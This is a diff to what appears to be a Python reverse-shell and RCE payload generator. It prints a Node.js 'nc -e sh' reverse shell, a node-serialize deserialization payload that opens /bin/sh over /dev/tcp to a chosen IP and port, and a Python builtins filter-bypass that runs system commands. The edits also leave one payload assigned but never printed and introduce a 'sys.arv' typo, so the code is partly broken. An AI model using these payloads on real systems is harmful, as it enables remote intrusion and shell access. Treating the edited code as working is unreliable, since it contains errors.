@@ -182,12 +182,12 @@ def nodejs(ip,port,type):
     if type == "d":
         print("\nrequire('child_process').exec('nc -e sh",ip,port+"')")
     elif type == "func":
-        print("{\"rce\":\"_$$ND_FUNC$$_function(){require(\\\"child_process\\\").execSync(\\\"/bin/b$()ash -c '/bin/sh -i >& /dev/tcp/"+ip+"/"+port,"0>&1\'\\\")}()\"}")
+        ultimato = "{\"rce\":\"_$$ND_FUNC$$_function(){require(\\\"child_process\\\").execSync(\\\"/bin/b$()ash -c '/bin/sh -i >& /dev/tcp/"+ip+"/"+port,"0>&1\'\\\")}()\"}"
 
 def privesc():
     builtins_filter_bypass =    "__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat ok.txt')";
     print(builtins_filter_bypass)
-menu()
+
 
 try:
     if sys.argv[1] == "1a":
@@ -215,5 +215,8 @@ try:
     elif sys.argv[1] == "2a":
         print("Builtin's RCE - Filter Bypass:")
         privesc()
+    elif sys.arv[1] == "--help":
+        menu()
 except:
+    menu()
     print("Some parameter is missing...")
